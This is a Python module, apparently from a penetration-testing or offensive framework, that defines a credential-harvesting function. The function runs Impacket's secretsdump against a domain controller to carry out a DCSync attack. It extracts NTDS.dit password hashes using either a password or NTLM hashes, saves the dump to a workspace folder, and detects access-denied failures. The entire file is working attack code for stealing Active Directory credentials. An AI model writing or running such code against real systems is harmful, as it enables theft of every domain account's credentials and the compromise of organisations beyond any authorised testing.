import os
import logging
from core.logger import setup_logger
import subprocess

logger = setup_logger()

def run_credential_harvesting(dc_ip: str, domain: str, username: str, password: str, hashes: str, workspace: str) -> bool:
    """Attempt DCSync (NTDS.dit extraction) using Impacket's secretsdump.
    Returns True on success, False otherwise.
    """
    logger.info("[*] Attempting DCSync via secretsdump for %s\\%s", domain, username)
    # Build the target string for secretsdump: <domain>/<username>:<password>@<dc_ip>
    import sys, shutil
    impacket_script = shutil.which("secretsdump.py")
    if not impacket_script:
        impacket_script = os.path.join(os.path.dirname(sys.executable), "secretsdump.py")

    if hashes:
        # NTLM hash format: lmhash:nthash
        target = f"{domain}/{username}@{dc_ip}"  # secretsdump will use -hashes option
        cmd = [sys.executable, impacket_script, "-hashes", hashes, "-outputfile", "dcsync_dump", target]
    else:
        target = f"{domain}/{username}:{password}@{dc_ip}"
        cmd = [sys.executable, impacket_script, "-outputfile", "dcsync_dump", target]
    # Run in the workspace directory so output files land there
    workspace_dir = os.path.join(os.getcwd(), 'workspaces', workspace)
    logger.debug("Executing command: %s", " ".join(cmd))
    try:
        result = subprocess.run(cmd, cwd=workspace_dir, capture_output=True, text=True)
        out_file = os.path.join(workspace_dir, "dcsync_log.txt")
        with open(out_file, "w") as f:
            f.write(result.stdout)
            f.write(result.stderr)

        if result.returncode == 0:
            # secretsdump sometimes returns 0 even on access denied
            if "rpc_s_access_denied" in result.stdout.lower() or "rpc_s_access_denied" in result.stderr.lower():
                logger.error("[-] DCSync failed: Access Denied (user lacks DS-Replication-Get-Changes privilege)")
                return False
                
            logger.info(f"[+] DCSync completed successfully. Log saved to: {out_file}")
            return True
        else:
            # Check for access denied in non-zero exits as well
            if "rpc_s_access_denied" in result.stdout.lower() or "rpc_s_access_denied" in result.stderr.lower():
                logger.error("[-] DCSync failed: Access Denied (user lacks DS-Replication-Get-Changes privilege)")
            else:
                logger.error("[-] DCSync failed with exit code %s", result.returncode)
                logger.error("STDOUT: %s", result.stdout.strip())
                logger.error("STDERR: %s", result.stderr.strip())
            return False
    except FileNotFoundError:
        logger.error("[-] Command not found. Ensure python3 is in PATH and impacket is installed.")
        logger.error("Please run: pip install impacket")
        return False
    except Exception as e:
        logger.error("[-] Unexpected error during DCSync: %s", str(e))
        return False
